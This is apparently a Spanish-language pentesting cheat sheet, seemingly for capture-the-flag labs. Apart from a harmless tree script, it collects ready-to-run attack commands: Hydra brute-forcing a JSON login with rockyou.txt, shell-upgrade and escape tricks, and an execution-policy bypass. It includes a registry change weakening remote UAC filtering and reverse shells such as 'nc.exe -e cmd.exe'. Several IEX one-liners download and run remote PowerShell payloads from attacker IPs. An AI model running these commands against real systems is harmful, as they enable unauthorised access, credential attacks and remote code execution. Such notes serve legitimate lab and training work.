# General

## Utilidades

### Linux

#### tree.sh

```bash
#!/bin/bash
pwd=$(pwd)
echo Tree of: $pwd
find $pwd -print | sed -e "s;$pwd;\.;g;s;[^/]*\/;|__;g;s;__|; |;g"
#very simple script. REALLY!
echo '|__end tree'
```

## Herramientas

### Hydra

```bash
hydra -l <USER> -p <PASSWORD> <IP_ADDRESS> http-post-form "<LOGIN_PAGE>:<REQUEST_BODY>:<ERROR_MESSAGE>"
```

##### JSON Payload

```bash
hydra -l "root@dasith.works" -P "/usr/share/wordlists/rockyou.txt" -s 3000 10.129.244.81 http-post-form "/api/user/login:{\"email\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:S=Password is wrong:H=content-type: application/json"
```

## TTY

### Linux

```text
ctrl + z
echo $TERM && tput lines && tput cols

# bash
stty raw -echo
fg

# zsh
stty raw -echo; fg

reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```

socat:

```bash
socat file:`tty`,raw,echo=0 tcp-listen:1234
```

Intérprete:

```text
/usr/bin/script -qc /bin/bash /dev/null
/bin/sh -i
python3 -c 'import pty; pty.spawn("/bin/sh")'
python3 -c "__import__('pty').spawn('/bin/bash')"
python3 -c "__import__('subprocess').call(['/bin/bash'])"
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
perl -e 'print `/bin/bash`'
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')

# vi
:!bash
:set shell=/bin/bash:shell

# nmap
!sh

# mysql
! bash
```

### Windows

[ConPtyShell](https://github.com/antonioCoco/ConPtyShell)

Server:

```bash
# 1
rlwrap nc -lvnp 3001

# 2
stty raw -echo; (stty size; cat) | nc -lvnp 3001
```

Cliente:

```powershell
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
```

# Proxy debugging

TODO: Agregar comandos de shellhacks.com para redireccionar todo el tráfico de la consola a burpsuite

# Windows

## Crackmapexec `(Pwn3d!)`

`cmd.exe /c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f`

## Powershell

### Bypass de execution policy

```powershell
powerShell.exe -ExecutionPolicy Bypass .\script.ps1
```

Refs: https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/

### Invoke command providing credentials

```powershell
$userName = 'WORKGROUP\Hector'
$userPassword = 'l33th4x0rhector'
$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force
$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword)
# ComputerName obtenida de los comandos: 
hostname
$env:COMPUTERNAME
[Environment]::MachineName

# Con o sin ComputerName en el caso de que sea local
Invoke-Command -ComputerName Fidelity -Credential $credObject -ScriptBlock {C:\Windows\Temp\nc.exe -e cmd.exe 10.10.14.16 4321}

Start-Process -FilePath 'powershell' -argumentlist "IEX(New-Object Net.webClient).downloadString('http://10.10.14.16/Invoke-PowerShellTcp.ps1')" -Credential $credObject
```